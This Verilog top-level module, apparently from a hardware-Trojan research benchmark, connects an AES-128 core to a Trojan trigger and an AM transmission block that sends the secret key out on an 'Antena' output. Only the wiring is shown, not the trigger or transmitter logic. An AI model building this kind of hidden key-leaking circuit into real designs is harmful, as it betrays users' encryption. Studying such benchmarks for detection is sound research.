`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date:    12:55:51 03/08/2013 
// Design Name: 
// Module Name:    top 
// Project Name: 
// Target Devices: 
// Tool versions: 
// Description: 
//
// Dependencies: 
//
// Revision: 
// Revision 0.01 - File Created
// Additional Comments: 
//
//////////////////////////////////////////////////////////////////////////////////
module top(clk, rst, state, key, out, Antena);
    input          clk, rst;
    input  [127:0] state, key;
    output [127:0] out;
    output Antena;
	 
	 wire Tj_Trig;

	aes_128 AES (clk, state, key, out);
	Trojan_Trigger Tj_Trigger (rst, out, Tj_Trig);
	AM_Transmission TSC (key, clk, rst, Tj_Trig, Antena);

endmodule
